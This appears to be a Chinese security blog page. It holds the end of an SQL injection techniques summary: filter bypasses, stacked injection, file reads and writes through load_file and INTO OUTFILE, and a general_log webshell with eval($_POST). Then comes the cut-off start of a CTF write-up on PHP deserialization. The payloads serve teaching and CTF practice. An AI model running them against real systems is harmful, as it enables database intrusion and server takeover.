<p>可以用like,regexp,between…and..,rlike进行代替，用法如下：<br><a href="https://imgchr.com/i/ZZ7QC4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZZ7QC4.md.png" alt="ZZ7QC4.md.png"></a></p>
<p>还有另外一种特殊的代替方法，利用<code>locate,position,instr</code>三种函数进行判断</p>
<p>用法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(locate(&#39;ro&#39;, substring(user(),1,2))&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(position(&#39;ro&#39; IN substring(user(),1,2))&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(instr(substring(user(),1,2),&#39;ro&#39;)&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>堆叠注入</strong></li>
</ul>
<p>例子：强网杯2019随便注</p>
<p>payload如下形式</p>
<p>查询字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;;use information_schema;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect column_name from columns wher&#39;,&#39;e table_name&#x3D;&quot;1919810931114514&quot;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>

<p>查询内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;use supersqli;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>load_file&amp;into outfile</strong></li>
</ul>
<p>这两个函数在sql注入中是影响比较大的两个函数，如果能成功利用，即可<code>getshell</code>和读取任意文件,但作用很大，同样限制条件也很多。</p>
<p><strong>into outfile</strong></p>
<p>1.首先要知道网站的绝对路径(可从报错或者phpinfo()中获得)</p>
<p>2.拥有file权限</p>
<p>3.secure_file_priv限制。通过<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;</code>查看信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqld --secure_file_priv&#x3D;null(不允许导入导出)</span><br><span class="line"></span><br><span class="line">mysqld --secure_file_priv&#x3D;&#x2F;tmp&#x2F;(导入导出只允许在&#x2F;tmp目录下)</span><br><span class="line"></span><br><span class="line">mysql  --secure_file_priv&#x3D;(任意导入导出)</span><br></pre></td></tr></table></figure>

<p><code>into outfile</code>有四种写入文件的方式</p>
<p><strong>通过union注入写入文件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 union select &#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;2.php&#39;;</span><br><span class="line">Query OK, 2 rows affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/Ze50qf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/Ze50qf.md.png" alt="Ze50qf.md.png"></a></p>
<p><strong>通过FIELDS TERMINATED BY写入文件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 into outfile &#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;3.php&#39; fields terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>

<p><code>FIELDS TERMINATED BY</code>为在输出数据的字段中添加<code>FIELDS TERMINATED BY</code>的内容，如果字段数为1，则无法进行添加，也就是说这个的限制条件是起码要有两个字段的。</p>
<p><a href="https://imgchr.com/i/ZeT9xA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZeT9xA.md.png" alt="ZeT9xA.md.png"></a></p>
<p>可以看到在一个字段的情况下无法添加我们的webshell。</p>
<p><strong>通过LINES TERMINATED BY写入文件</strong></p>
<p><code>LINES TERMINATED BY</code>为在每个记录后都添加设定添加的内容，不受字段数的限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 into outfile &#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;3.php&#39; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/ZeTbWQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZeTbWQ.md.png" alt="ZeTbWQ.md.png"></a></p>
<p><strong>LINES STARTING BY写入shell</strong></p>
<p>用法与<code>LINES TERMINATED BY</code>一样，payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 into outfile &#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39; lines starting by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>

<p><strong>load_file</strong></p>
<p>1.要求拥有file权限</p>
<p>2.知道文件所在绝对路径</p>
<p>3.同样受<code>secure_file_priv</code>限制</p>
<p><strong>union注入进行load_file</strong></p>
<p>效果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 union select load_file(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39;);</span><br><span class="line">+----------------------+</span><br><span class="line">| flag                 |</span><br><span class="line">+----------------------+</span><br><span class="line">| 1                    |</span><br><span class="line">| &lt;?php phpinfo();?&gt;1</span><br><span class="line"> |</span><br><span class="line">+----------------------+</span><br><span class="line">2 rows in set, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>

<p><strong>利用报错注入进行load_file</strong></p>
<p>测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 and updatexml(1,concat(0x7e,(select load_file(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39;)),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~&lt;?php phpinfo();?&gt;1</span><br><span class="line">~&#39;</span><br></pre></td></tr></table></figure>

<p>成功得到文件内容</p>
<p><strong>利用时间盲注进行load_file</strong></p>
<p>测试如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 and if(mid((select load_file(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39;)),1,1)&#x3D;&#39;&lt;&#39;,sleep(3),1);</span><br><span class="line">Empty set, 1 warning (3.00 sec)</span><br></pre></td></tr></table></figure>

<p>成功延时3s，可配合脚本得到文件内容。</p>
<p><strong>利用load_file扫描文件是否存在</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;&#39; and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39;)),0x7e),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~0~&#39;</span><br><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;&#39; and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;1.php&#39;)),0x7e),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~1~&#39;</span><br></pre></td></tr></table></figure>

<p>通过<code>is_null</code>函数的返回值来确定，如果是1的话代表文件不存在，如果是0的话文件存在。此方法可配合burp进行敏感文件的FUZZ。</p>
<p><strong>另类写读文件</strong></p>
<p><strong>dumpfile</strong> 官方文档如下：</p>
<p><a href="https://imgchr.com/i/Zmk139" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/Zmk139.md.png" alt="Zmk139.md.png"></a></p>
<p><strong>危险变量导致getshell</strong></p>
<p>在我们可连接上被攻击数据库时，我们可以通过<code>select..into outfile..</code>进行写shell，但如果<code>secure_file_priv</code>为NULL且不可更改时，我们就无法通过这种形式去getshell。除了这种写shell的方式还有一种通过日志去写shell的方式，操作如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;; 查看配置信息</span><br><span class="line"></span><br><span class="line">set global general_log&#x3D;on 开启general log模式</span><br><span class="line"></span><br><span class="line">set global general_log_file&#x3D;&#39;F:\\phpstudy\\www\\shell.php&#39;;</span><br><span class="line"></span><br><span class="line">select &#39;&lt;?php eval($_POST[&#39;pwd&#39;]);?&gt;&#39;;</span><br></pre></td></tr></table></figure>

<p>最终<code>shell.php</code>为我们的<code>webshell</code></p>
<p><a href="https://imgchr.com/i/ZmGHSI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZmGHSI.md.png" alt="ZmGHSI.md.png"></a></p>
<h3 id="组合拳思考"><a href="#组合拳思考" class="headerlink" title="组合拳思考"></a>组合拳思考</h3><p>我们在常规的注入中，流程应该就是查找数据库，查找表，查找字段，爆字段。</p>
<p>其实利用上面的方法，我们可以做操作来绕过条件过滤。</p>
<p>以<code>Sqli-lab less-1</code>为例</p>
<p>首先通过<code>polygon</code>函数进行报错</p>
<p><a href="https://imgchr.com/i/Zmuiy4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/Zmuiy4.md.png" alt="Zmuiy4.md.png"></a></p>
<p>接着通过列重复来报错</p>
<p><a href="https://imgchr.com/i/ZmK8vF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZmK8vF.md.png" alt="ZmK8vF.md.png"></a></p>
<p><a href="https://imgchr.com/i/ZmKyKe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZmKyKe.md.png" alt="ZmKyKe.md.png"></a></p>
<p>通过以上步骤可爆出<code>id,username,password</code>三个字段，最终爆出字段内容。</p>
<p><a href="https://imgchr.com/i/ZmMzFI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZmMzFI.md.png" alt="ZmMzFI.md.png"></a></p>
<p>同理，order by盲注也比较有用，在列名以及小括号被过滤的情况下就比较适合。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://xz.aliyun.com/t/2460" target="_blank" rel="noopener">https://xz.aliyun.com/t/2460</a></p>
<p><a href="http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/" target="_blank" rel="noopener">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></p>
<p><a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/29/SQL%E6%B3%A8%E5%85%A5%E6%9C%89%E8%B6%A3%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" data-id="ckabsu38i001wkkvr403fglv1" class="article-share-link" data-share="baidu" data-title="SQL注入有趣姿势总结">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/29/SQL%E6%B3%A8%E5%85%A5%E6%9C%89%E8%B6%A3%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-2016-0CTF-piapiapia-反序列化逃逸字符" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/07/2016-0CTF-piapiapia-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E5%AD%97%E7%AC%A6/" class="article-date">
  <time datetime="2019-06-07T07:08:46.000Z" itemprop="datePublished">2019-06-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/07/2016-0CTF-piapiapia-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E5%AD%97%E7%AC%A6/">2016-0CTF-piapiapia(反序列化逃逸字符)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>即将迎来考试周，而自己的主课还没怎么复习….还总想着刷小说Orz,堕落的有点难受，来找一道代码审计题来学习一下。</p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>进入页面</p>
<p><a href="https://imgchr.com/i/VwxTqs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/07/VwxTqs.md.png" alt="VwxTqs.md.png"></a></p>
<p>一个可爱的猫图，扫下目录看，发现了<code>www.zip</code></p>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">   <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Login First'</span>);    </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">      $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">      <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">      $file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">      <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">      move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">      $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">      $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">      $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">      $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">      $user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">   $config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">   $config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">   $config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">   $flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">   <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>]) &#123;</span><br><span class="line">      header(<span class="string">'Location: profile.php'</span>);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>($_POST[<span class="string">'username'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]) &#123;</span><br><span class="line">      $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">      $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid user name'</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid password'</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class="line">         $_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">         header(<span class="string">'Location: profile.php'</span>);</span><br><span class="line">         <span class="keyword">exit</span>;  </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid user name or password'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>profile.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">   <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Login First'</span>);    </span><br><span class="line">   &#125;</span><br><span class="line">   $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">   $profile=$user-&gt;show_profile($username);</span><br><span class="line">   <span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">      header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">      $profile = unserialize($profile);</span><br><span class="line">      $phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">      $email = $profile[<span class="string">'email'</span>];</span><br><span class="line">      $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">      $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>update.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">   <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Login First'</span>);    </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">      $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">      <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">      $file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">      <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">      move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">      $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">      $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">      $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">      $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">      $user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过源代码可以发现flag是在<code>config.php</code>中的，主要的利用文件在于<code>update.php</code>,<code>profile.php</code></p>
<h3 id="代码审计过程"><a href="#代码审计过程" class="headerlink" title="代码审计过程"></a>代码审计过程</h3><p>主要功能函数在于class.php,所以先看的也是class.php</p>
<p>Mysql类中的filter函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">	$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;  <span class="comment">//   /'|\\/</span></span><br><span class="line">	$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">	$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">	$safe = <span class="string">'/'</span> . 